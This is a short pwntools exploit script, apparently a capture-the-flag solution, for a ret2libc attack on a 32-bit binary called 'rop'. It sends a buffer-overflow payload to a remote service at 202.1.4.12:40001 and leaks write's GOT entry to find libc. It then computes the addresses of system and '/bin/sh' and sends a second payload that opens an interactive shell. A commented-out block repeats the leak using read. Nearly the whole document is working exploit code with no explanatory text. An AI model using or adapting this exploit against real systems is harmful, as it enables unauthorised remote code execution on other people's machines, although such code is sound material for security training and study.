from pwn import *
elf = ELF('rop')
plt_write=elf.plt['write']
got_write=elf.got['write']
rop1 = 'R'*140+p32(plt_write)+p32(0x80484c6)+p32(1)+p32(got_write)+p32(4)+p32(0x80484c6)

p=remote('202.1.4.12',40001)
p.sendline(rop1)
write_real = u32(p.recv())
print hex(write_real)
write_offset=0xd43c0
libc_addr = write_real - write_offset
system_addr = libc_addr + 0x3a940
binsh_addr = libc_addr + 0x15902b

rop3 = 'R'*140+p32(system_addr) + p32(0x80484c6) +p32(binsh_addr)
#p=remote('202.1.4.12',40001)
p.sendline(rop3)
p.interactive()







#got_read = elf.got['read']
#rop2 = 'R'*140+p32(plt_write)+p32(0x80484c6)+p32(1)+p32(got_read)+p32(4)
#p=remote('202.1.4.12',40001)
#p.sendline(rop2)
#read_real=u32(p.recv())
#print hex(read_real)

